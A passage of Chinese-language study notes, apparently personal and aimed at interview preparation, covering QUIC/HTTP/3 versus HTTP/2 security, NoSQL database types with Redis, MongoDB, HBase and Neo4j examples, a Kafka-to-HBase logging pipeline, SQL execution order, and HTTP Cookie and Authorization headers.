<li>因为是应用自定义协议，QUIC 可以对自己设计的 <strong>协议头 + 数据</strong> 一起加密。</li>
<li>因此攻击者看到的只是一堆 <strong>加密的 UDP 数据包</strong>，看不到：
<ul>
<li>通信内容 ✅</li>
<li>QUIC 包头（如流 ID、顺序号）✅</li>
<li>哪条流、发送顺序、是否重试等关键控制信息 ✅</li>
</ul>
</li>
</ul>
<h2 id="🧠-举个实际例子：防止攻击">🧠 举个实际例子：防止攻击</h2>
<h3 id="情境：">情境：</h3>
<p>你在访问一个银行网页 <code>https://bank.com</code>，进行资金操作，攻击者在你和银行之间监听。</p>
<h3 id="▶️-使用-HTTP-2-0（TCP-TLS）">▶️ 使用 HTTP/2.0（TCP + TLS）</h3>
<ul>
<li>攻击者虽然看不到内容，但可以看到：
<ul>
<li>你在和 <code>bank.com:443</code> 通信</li>
<li>你发送了大约 20 个请求（通过包大小和频率估计）</li>
<li>哪些是请求、哪些是响应（通过数据流方向和时间猜测）</li>
</ul>
</li>
</ul>
<p>攻击者可以：</p>
<ul>
<li><strong>猜测是资金转账</strong>页面，发起 TCP 拦截，丢弃关键数据包，造成失败或混乱</li>
<li>利用 TCP 队头阻塞行为延迟重要响应（例如验证码图）</li>
</ul>
<h3 id="▶️-使用-HTTP-3-0（QUIC-UDP）">▶️ 使用 HTTP/3.0（QUIC + UDP）</h3>
<ul>
<li>攻击者看到的只有一堆加密 UDP 数据包</li>
<li><strong>连 QUIC 的控制信息都被加密</strong>，比如哪个是第几条流、哪个包是控制包、哪个是数据包</li>
</ul>
<p>攻击者无法有效干扰通信：</p>
<ul>
<li>无法发起基于 TCP 的攻击（因为根本没用 TCP）</li>
<li>无法猜测你操作了什么页面</li>
<li>即便伪造/篡改数据，也会被 QUIC 校验失败丢弃</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTI3ZWQ4MzA1MmY4MmMxNzBlMTYwNTQ0YzYyMmYyMmRfVW1SQ1RhVE1SVUttUzRxNnpQbnN6YUxVTFkybzFhaWFfVG9rZW46STFJMmJzbjE2bzlMSTN4OHNPSWNmRzdsblBiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzZjZWM2MjgxNTg2ZmNjMDU5MDEzYjVkZmMyNjQzMDdfQmlnZ1V4aFRUb1U5WVI0ZVVROTVKMWxxRmp3WnU1eVlfVG9rZW46WFJqRmI0aTJqb1RBbnR4bkoxRmNYTHpkbkhiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>从上图可以看出：</p>
<ul>
<li><strong>HTTP/2.0</strong>：使用 TCP 作为传输协议、使用 HPACK 进行头部压缩、依赖 TLS 进行加密。</li>
<li><strong>HTTP/3.0</strong>：使用基于 UDP 的 QUIC 协议、使用更高效的 QPACK 进行头部压缩、在 QUIC 中直接集成了 TLS。QUIC 协议具备连接迁移、拥塞控制与避免、流量控制等特性。</li>
</ul>
<h1>SQL和NoSQL有什么区别</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg5ZDU5NWM4NzcxN2E3YTZiNzJhMTliNTdjYmUwMTJfY2pOdUtDbUtBTkNuV3RqN0dUVEszU0Fod1VLVkdjVDhfVG9rZW46RzZKVmJQM0V3b0p6QWh4VU56WGNQelhUbmZlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA2ZWVlNzIwYjBjZTkxMWYzOTljNWVjNWVkNzFjN2ZfczZtU2RuQVYwc1lEYXBvYXJpanhSdDZrb2t0eVozUEhfVG9rZW46QWNpOWJFQWtDb0ZqbGx4eERMUWM1VGJSblhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔶-一、Key-Value-型数据库（如-Redis）">🔶 一、Key-Value 型数据库（如 Redis）</h2>
<h3 id="✅-应用示例：电商平台的商品秒杀系统">✅ 应用示例：电商平台的商品秒杀系统</h3>
<ul>
<li><strong>场景</strong>：高并发下抢购商品库存管理。</li>
<li><strong>做法</strong>：
<ul>
<li>使用 Redis 存储商品库存数量：</li>
<li><code>set stock:sku123 100</code></li>
<li></li>
<li>每次抢购请求时执行：</li>
<li><code>decr stock:sku123</code></li>
</ul>
</li>
<li><strong>优势</strong>：
<ul>
<li>操作快，支持原子递减；</li>
<li>抗高并发，减轻数据库压力；</li>
<li>防止超卖、秒杀场景下性能瓶颈。</li>
</ul>
</li>
</ul>
<h2 id="🔶-二、Document-型数据库（如-MongoDB）">🔶 二、Document 型数据库（如 MongoDB）</h2>
<h3 id="✅-应用示例：内容管理系统（CMS）-文章发布平台">✅ 应用示例：内容管理系统（CMS）/ 文章发布平台</h3>
<ul>
<li><strong>场景</strong>：每篇文章结构不一，内容字段可能包含评论、标签、作者信息等嵌套字段。</li>
<li><strong>数据样例</strong>（MongoDB 中的一条文档）：</li>
<li><code>&#123; ``  &quot;_id&quot;: ObjectId(&quot;...&quot;), ``  &quot;title&quot;: &quot;NoSQL 数据库介绍&quot;, ``  &quot;author&quot;: &#123; &quot;name&quot;: &quot;小明&quot;, &quot;email&quot;: &quot;xm@example.com&quot; &#125;, ``  &quot;tags&quot;: [&quot;数据库&quot;, &quot;NoSQL&quot;], ``  &quot;comments&quot;: [ ``    &#123; &quot;user&quot;: &quot;小红&quot;, &quot;content&quot;: &quot;很有帮助&quot;, &quot;time&quot;: &quot;2025-05-01&quot; &#125; ``  ], ``  &quot;published&quot;: true, ``  &quot;created_at&quot;: &quot;2025-04-30&quot; ``&#125;</code></li>
<li><strong>优势</strong>：
<ul>
<li>支持灵活结构；</li>
<li>存储结构与前端 JSON 对象天然契合；</li>
<li>不需要频繁变更数据库表结构（相比 MySQL 更灵活）。</li>
</ul>
</li>
</ul>
<h2 id="🔶-三、Column-Family-型数据库（如-HBase、Cassandra）">🔶 三、Column-Family 型数据库（如 HBase、Cassandra）</h2>
<h3 id="✅-应用示例：用户行为日志存储系统">✅ 应用示例：用户行为日志存储系统</h3>
<ul>
<li><strong>场景</strong>：某平台记录用户点击、浏览、搜索等行为，每天数亿条。</li>
<li><strong>做法</strong>：
<ul>
<li>以用户 ID + 时间戳作为行键；</li>
<li>每种行为作为一个列族；</li>
<li>数据按列压缩、按时间排序存储，快速检索。</li>
</ul>
</li>
<li><strong>优势</strong>：
<ul>
<li>高写入性能（适合批量插入）；</li>
<li>支持水平扩展；</li>
<li>适合大数据存储场景，如日志、IoT。</li>
</ul>
</li>
</ul>
<h2 id="🔶-四、Graph-型数据库（如-Neo4j）">🔶 四、Graph 型数据库（如 Neo4j）</h2>
<h3 id="✅-应用示例：社交网络好友推荐">✅ 应用示例：社交网络好友推荐</h3>
<ul>
<li><strong>场景</strong>：推荐“你可能认识的人”</li>
<li><strong>做法</strong>：
<ul>
<li>用户为节点；</li>
<li>“关注”或“好友”关系为边；</li>
<li>查询：找到你朋友的朋友但不是你的朋友的人，按共同好友数排序推荐。</li>
</ul>
</li>
<li><strong>图数据库查询示例（Cypher 语法）</strong>：</li>
<li><code>MATCH (me:User &#123;id: 1&#125;)-[:FRIEND]-&gt;(f1)-[:FRIEND]-&gt;(f2) ``WHERE NOT (me)-[:FRIEND]-&gt;(f2) ``RETURN f2.name, count(*) AS mutualFriends ``ORDER BY mutualFriends DESC</code></li>
<li><strong>优势</strong>：
<ul>
<li>关系复杂时效率远高于 JOIN；</li>
<li>用在推荐系统、权限系统、知识图谱中非常合适。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGY4NDJkYjEyYTQxMzI0MzFmODI3MGVjZGYyYTZjMGVfbkxPRnRWVFY1OHo4MVZ2V3djUVRUWjN6QUFjWllQaHpfVG9rZW46SzV2UGJ6eHp4b3N2Q0p4YnFuVWNhMm1VbmhoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>我们来详细举一个 <strong>使用 Column-Family 数据库（如 HBase）来存储用户行为日志</strong> 的完整例子。</p>
<h2 id="🔶-场景：用户行为日志系统（如：电商网站）">🔶 场景：用户行为日志系统（如：电商网站）</h2>
<p>目标是记录每个用户每天的操作，比如：</p>
<ul>
<li>浏览商品（view）</li>
<li>添加购物车（add_to_cart）</li>
<li>下单（place_order）</li>
<li>搜索商品（search）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzgyYzUzNmI1ZDg5OTlhNjgxMWUzYjgxYmVjZWE3ZGNfdWNab3VNNHJRRnh0Z2kybEF4UW1XM1J0amZQRDlCaURfVG9rZW46Q3FBUmJ4ZUxsb2pMSXl4Zk1nZmNJWmd1bmVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔍-查询操作举例：">🔍 查询操作举例：</h2>
<h3 id="查询用户-u1234-的所有操作记录（时间倒序）：">查询用户 u1234 的所有操作记录（时间倒序）：</h3>
<ul>
<li>HBase 支持按 RowKey 有序存储；</li>
<li>RowKey 使用 <code>userId + 时间戳倒排</code>（如 99999999999999 - 当前时间戳）即可实现倒序检索。</li>
</ul>
<h2 id="✅-优势总结：">✅ 优势总结：</h2>
<ul>
<li><strong>高写入性能</strong>：支持海量写入（每天数亿条）；</li>
<li><strong>可扩展性强</strong>：HBase 支持横向扩展；</li>
<li><strong>数据压缩好</strong>：相同列族压缩率高；</li>
<li><strong>查询高效</strong>：按 RowKey/时间范围快速定位。</li>
</ul>
<blockquote>
<p><strong>这两个用户行为（浏览商品 + 搜索耳机）到底是怎么“生成消息”并“储存”到 HBase 里的？</strong></p>
<p>我们一步一步拆解说明，涉及三个关键步骤：</p>
</blockquote>
<h2 id="✅-第一步：用户行为生成-——-来自前端或-App-的埋点">✅ 第一步：用户行为生成 —— 来自前端或 App 的埋点</h2>
<p>用户操作时，前端会通过 JavaScript 或埋点 SDK 把行为信息打包发到后端，例如：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;userId&quot;</span>: <span class="string">&quot;u1234&quot;</span>, <span class="string">``</span>  <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2025-05-15 09:01:00&quot;</span>, <span class="string">``</span>  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">``</span>  <span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;sku5678&quot;</span>, <span class="string">``</span>  <span class="string">&quot;page_id&quot;</span>: <span class="string">&quot;home&quot;</span> <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>或者搜索时：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;userId&quot;</span>: <span class="string">&quot;u1234&quot;</span>, <span class="string">``</span>  <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2025-05-15 09:05:20&quot;</span>, <span class="string">``</span>  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;search&quot;</span>, <span class="string">``</span>  <span class="string">&quot;keyword&quot;</span>: <span class="string">&quot;耳机&quot;</span>, <span class="string">``</span>  <span class="string">&quot;page_id&quot;</span>: <span class="string">&quot;searchPage&quot;</span> <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这些行为被称为 <strong>行为日志/埋点事件</strong>。</p>
<h2 id="✅-第二步：消息传递-——-通常经由消息队列（如-Kafka）">✅ 第二步：消息传递 —— 通常经由消息队列（如 Kafka）</h2>
<p>为了高并发 + 异步解耦，前端行为日志不会直接写数据库，而是发送到 Kafka 等消息队列：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Topic: user_behavior_log <span class="string">``</span>Message1: <span class="string">``</span>&#123;</span><br><span class="line"><span class="string">&quot;userId&quot;</span>: <span class="string">&quot;u1234&quot;</span>,</span><br><span class="line"><span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2025-05-15 09:01:00&quot;</span>,</span><br><span class="line"><span class="string">&quot;type&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line"><span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;sku5678&quot;</span>,</span><br><span class="line"><span class="string">&quot;page_id&quot;</span>: <span class="string">&quot;home&quot;</span></span><br><span class="line">&#125; </span><br><span class="line">Message2: <span class="string">``</span>&#123;</span><br><span class="line"><span class="string">&quot;userId&quot;</span>: <span class="string">&quot;u1234&quot;</span>,</span><br><span class="line"><span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2025-05-15 09:05:20&quot;</span>,</span><br><span class="line"><span class="string">&quot;type&quot;</span>: <span class="string">&quot;search&quot;</span>,</span><br><span class="line"><span class="string">&quot;keyword&quot;</span>: <span class="string">&quot;耳机&quot;</span>,</span><br><span class="line"><span class="string">&quot;page_id&quot;</span>: <span class="string">&quot;searchPage&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Kafka 会把这些消息暂时缓存在 Topic 中，等待消费者处理。</p>
<h2 id="✅-第三步：消费者消费消息并写入-HBase">✅ 第三步：消费者消费消息并写入 HBase</h2>
<p>后台有一组消费者（Consumer），持续从 Kafka 读取用户行为日志，并写入 HBase：</p>
<h3 id="Java-写入逻辑示意：">Java 写入逻辑示意：</h3>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void saveToHBase(JSONObject behavior) &#123;</span><br><span class="line">String userId = behavior.getString(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">String timestamp = behavior.getString(<span class="string">&quot;timestamp&quot;</span>).<span class="keyword">replace</span>(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).<span class="keyword">replace</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).<span class="keyword">replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">String rowKey = userId + <span class="string">&quot;_&quot;</span> + timestamp; </span><br><span class="line"><span class="keyword">Put</span> <span class="keyword">put</span> = new <span class="meta">Put</span>(Bytes.toBytes(rowKey)); ``// 写入公共字段` `<span class="keyword">put</span>.addColum<span class="meta">n</span>(Bytes.toBytes(<span class="string">&quot;action&quot;</span>),Bytes.toBytes(<span class="string">&quot;type&quot;</span>),Bytes.toBytes(behavior.getString(<span class="string">&quot;type&quot;</span>))); ``<span class="keyword">put</span>.addColum<span class="meta">n</span>(Bytes.toBytes(<span class="string">&quot;action&quot;</span>),Bytes.toBytes(<span class="string">&quot;page_id&quot;</span>),Bytes.toBytes(behavior.getString(<span class="string">&quot;page_id&quot;</span>))); </span><br><span class="line">// 根据行为类型写入不同字段 ``<span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(behavior.getString(<span class="string">&quot;type&quot;</span>))) &#123; ``    <span class="keyword">put</span>.addColum<span class="meta">n</span>(Bytes.toBytes(<span class="string">&quot;action&quot;</span>), Bytes.toBytes(<span class="string">&quot;item_id&quot;</span>), Bytes.toBytes(behavior.getString(<span class="string">&quot;item_id&quot;</span>))); ``&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;search&quot;</span>.equals(behavior.getString(<span class="string">&quot;type&quot;</span>))) &#123; ``    <span class="keyword">put</span>.addColum<span class="meta">n</span>(Bytes.toBytes(<span class="string">&quot;action&quot;</span>), Bytes.toBytes(<span class="string">&quot;keyword&quot;</span>), Bytes.toBytes(behavior.getString(<span class="string">&quot;keyword&quot;</span>))); ``&#125; </span><br><span class="line">hbaseTable.<span class="meta">put</span>(<span class="keyword">put</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTg5ODMyM2Q2MzVjNjc4ZWVhMjc2NDEyY2NmNmRmZjhfOHlUMG9kRGFsTlIwaUhDNkthV0VNVFAzOUV1VGUwcU1fVG9rZW46VjhoVGJ3QW1mb1BjYld4Z09CU2NwV1JSblhiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>sql执行顺序</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGMzZGJhMmIzMmE5Zjc5NjExOGYxYTExOGEzYzI3OTdfTWJrRlB6SWJmRUxmSWlnVmpxckZzZXF4cXNmNTNFSUxfVG9rZW46UDVLZmJnSm9Fb2MzU1J4OXVnTWNONTZZbldkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="📌-举个例子：">📌 举个例子：</h3>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">COUNT</span>(*) <span class="keyword">AS</span> order_count<span class="symbol">` `</span><span class="keyword">FROM</span> orders<span class="symbol">` `</span><span class="keyword">WHERE</span> order_date &gt;= <span class="string">&#x27;2024-01-01&#x27;</span> <span class="symbol">``</span><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id<span class="symbol">` `</span><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(*) &gt; <span class="number">5</span> <span class="symbol">``</span><span class="keyword">ORDER</span> <span class="keyword">BY</span> order_count <span class="keyword">DESC</span><span class="symbol">` `</span><span class="keyword">LIMIT</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<h4 id="实际执行顺序如下：">实际执行顺序如下：</h4>
<ol>
<li><code>FROM orders</code> → 选择数据来源；</li>
<li><code>WHERE order_date &gt;= '2024-01-01'</code> → 筛选符合日期条件的记录；</li>
<li><code>GROUP BY customer_id</code> → 将订单按客户分组；</li>
<li><code>HAVING COUNT(*) &gt; 5</code> → 只保留订单数大于 5 的客户；</li>
<li><code>SELECT customer_id, COUNT(*) AS order_count</code> → 提取需要的列；</li>
<li><code>ORDER BY order_count DESC</code> → 结果降序排序；</li>
<li><code>LIMIT 10</code> → 返回前 10 条。</li>
</ol>
<h3 id="🔺小贴士：">🔺小贴士：</h3>
<ul>
<li><code>WHERE</code> 不能用聚合函数，<code>HAVING</code> 才能。</li>
<li><code>SELECT</code> 写在前，但逻辑执行在后。</li>
<li>多表查询时，<code>JOIN</code> 是 <code>FROM</code> 的一部分。</li>
<li><code>ORDER BY</code> 是最后执行的（分页前排序）。</li>
</ul>
<blockquote>
<p><strong>SQL 中的</strong> <strong><code>WHERE</code></strong> <strong>子句</strong> 是在 <strong>数据还没分组（GROUP BY）前</strong> 进行<strong>行过滤</strong>的，所以它 <strong>不能使用聚合函数（如</strong> <strong><code>SUM()</code><strong><strong>、</strong></strong><code>COUNT()</code><strong><strong>、</strong></strong><code>AVG()</code></strong> <strong>等）</strong>。</p>
</blockquote>
<p>而：</p>
<blockquote>
<p><strong><code>HAVING</code></strong> <strong>子句</strong> 是在 <strong>数据分组之后</strong> 才执行的，它用来对<strong>分组后的结果</strong>进行过滤，<strong>是支持聚合函数的</strong>。</p>
</blockquote>
<h3 id="✅-举例说明：">✅ 举例说明：</h3>
<h4 id="🚫-错误用法（WHERE-不能用聚合函数）：">🚫 错误用法（<code>WHERE</code> 不能用聚合函数）：</h4>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dept_id, COUNT<span class="comment">(*) AS emp_count` `FROM employees` `WHERE COUNT(*)</span> &gt; <span class="number">5</span>  -- ❌ 错误：<span class="keyword">WHERE</span> 中不能使用聚合函数 ``<span class="keyword">GROUP</span> <span class="keyword">BY</span> dept_id<span class="punctuation">;</span></span><br></pre></td></tr></table></figure>
<h4 id="✅-正确用法（用-HAVING-过滤分组后的结果）：">✅ 正确用法（用 <code>HAVING</code> 过滤分组后的结果）：</h4>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dept_id, <span class="built_in">COUNT</span>(*) <span class="keyword">AS</span> emp_count<span class="symbol">` `</span><span class="keyword">FROM</span> employees<span class="symbol">` `</span><span class="keyword">GROUP</span> <span class="keyword">BY</span> dept_id<span class="symbol">` `</span><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(*) &gt; <span class="number">5</span>;  -- ✅ 正确：HAVING 后可以用聚合函数</span><br></pre></td></tr></table></figure>
<h3 id="📌-SQL-执行的逻辑顺序（简化版）：">📌 SQL 执行的逻辑顺序（简化版）：</h3>
<ol>
<li><code>FROM</code> —— 先确定数据源</li>
<li><code>WHERE</code> —— 原始行过滤</li>
<li><code>GROUP BY</code> —— 分组</li>
<li><code>聚合函数计算</code>（如 COUNT、SUM 等）</li>
<li><code>HAVING</code> —— 对聚合后的每组结果进行过滤</li>
<li><code>SELECT</code> —— 确定要返回的列，可以用聚合函数或别名</li>
<li><code>ORDER BY</code> —— 排序（可以用别名）</li>
<li><code>LIMIT</code> —— 限制返回行数</li>
</ol>
<blockquote>
<p>🔹 虽然在书写时 <code>SELECT</code> 在 <code>HAVING</code> 前面，<strong>但实际上是先聚合再过滤</strong>，所以可以使用 SELECT 里的别名（这是 <code>HAVING</code> 与 <code>WHERE</code> 的最大区别之一）。</p>
</blockquote>
<p>所以：</p>
<p>SELECT order_num, COUNT(*) AS items</p>
<p>FROM OrderItems</p>
<p>GROUP BY order_num</p>
<p>HAVING items &gt;= 3</p>
<p>ORDER BY items, order_num;</p>
<p>是正确的，因为select中的count聚合函数在HAVING前运行，此时items已经定义好</p>
<p>如果是：</p>
<p>SELECT order_num, order_item AS items</p>
<p>FROM OrderItems</p>
<p>GROUP BY order_num</p>
<p>HAVING items &gt;= 3</p>
<p>ORDER BY items, order_num;</p>
<p>是错误的，因为select语句是在HAVING之后运行，此时items还未定义</p>
<h1>返回顾客名称和相关订单号以及每个订单的总价</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmU1MWVlYTY4ZTAzMjg1NDkzNDM4ZjI2ZWFhZWJkY2ZfVThBbXM4N1ZFSGRqVVRKQ1hOalF5NDhnd25USkVIcG1fVG9rZW46WnRQZGJ0UTFPb2l1SXB4VnBsQmNBMWZHbktnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTliODg2MzA2ZTM5NDJmOTdmMzZkOWE0NDA4YTQwNmZfU0pZT24xZkxPajlYMXJKbVpXR3kwM1hLaEZjSVl2bXRfVG9rZW46Q1EzR2IyN0hpbzh0WFR4bDJweWNWNFFublNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-关键结论（要记住）：">✅ 关键结论（要记住）：</h2>
<blockquote>
<p><strong>SELECT 中的字段要么全部出现在 GROUP BY 中，要么只能用聚合函数包装。</strong></p>
</blockquote>
<h2 id="🧠-为什么？">🧠 为什么？</h2>
<p>SQL 在执行 <code>GROUP BY</code> 时，是<strong>按你指定的字段分组</strong>，每一组会生成一行结果。那么：</p>
<ul>
<li><strong>出现在 SELECT 中的字段</strong>，如果不是聚合函数（如 <code>SUM()</code>、<code>COUNT()</code>）包装的，就必须是用于分组的字段；</li>
<li>否则 SQL 就不知道这列在每组里该返回什么值（因为一组里可能有多个值）；</li>
<li>所以就报错。</li>
</ul>
<h1>javaguide-计网</h1>
<h2 id="HTTP-Header的常见面试问题">HTTP Header的常见面试问题</h2>
<h2 id="🎯-面试高频问题：">🎯 面试高频问题：</h2>
<ol>
<li><strong>说说 Cookie 和 Authorization 的区别？分别在哪些 header 中出现？</strong></li>
<li><strong>如何实现前端缓存控制？涉及哪些响应头？</strong></li>
<li><strong>CORS 如何实现？哪些 header 决定跨域是否允许？</strong></li>
<li><strong>如何用 ETag 和 Last-Modified 做协商缓存？请求头和响应头分别用什么？</strong></li>
<li><strong>User-Agent 在防爬虫中怎么用？Referer 有什么安全隐患？</strong></li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDIxZjMyY2FkZWVmM2RmZTFkZDMwZmQ0MWQ5YTI3MmZfcVMxOGZxajgzM21DVHYzdVJPb2k5ZTg0b2I1OFlTN2tfVG9rZW46V042TmJvOVN5b0p3am54R05uY2NtQlYxbnd6XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA4Yjc0NWUzZjg1ZDEyY2FmYzQ2MTZjZWRmNmRkNGRfRkdFUHQyZDFibEhyY3BkYjFZRlVySHc2UnpSZ0VzQThfVG9rZW46UmxDWGJDZ0Vrb0owUFF4ZGtEUGNiYlV2blplXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWFmYTg2MjRmODQzZjZmMTdmMjk3ZDcxOGEzYzU0M2RfNFBRTDE4R0ZQbHI2V3F2d21BSW5rT05DcE5QalRaQ29fVG9rZW46SlJpcmJKT3B4b2JxMVJ4ZUh1aGNCMmZxbnBiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDQ3YTViYjVkMDBhNjhhOTA3YTA5YmFiMjQyNTQ2ZjZfRGlUeEsyNUVRa2VqNzZFcTJyVUxPUkxhY1Y0cmtlR1lfVG9rZW46WWp1VmI0VmdzbzY4TnV4S045ZmM5QnlYbnNnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNiNWJhNWE1ZmMzOGUxNzQxZGU1NDlkNGFhOGE3YTlfcU5BbVA5SjJyYk1memRkQ1BiYkZsNHNHTmpGbGgxRU5fVG9rZW46Q3I3QmJXZ0JobzhPcGl4Rm9IUmNwaGpQbmNlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="✅-1-Cookie-和-Authorization-的区别——登录认证场景举例">✅ 1. Cookie 和 Authorization 的区别——登录认证场景举例</h3>
<p><strong>情景</strong>：用户访问一个电商网站登录后浏览商品</p>
<ul>
<li><strong>使用 Cookie 的情况</strong>：
<ul>
<li>用户输入账号密码登录，服务端校验成功后，生成一个 Session ID，例如 <code>SESSION_ID=abc123</code>。</li>
<li>响应头返回：<code>Set-Cookie: SESSION_ID=abc123; Path=/; HttpOnly</code></li>
<li>之后用户访问商品页时，浏览器自动在请求头中携带：</li>
<li><code>Cookie: SESSION_ID=abc123</code></li>
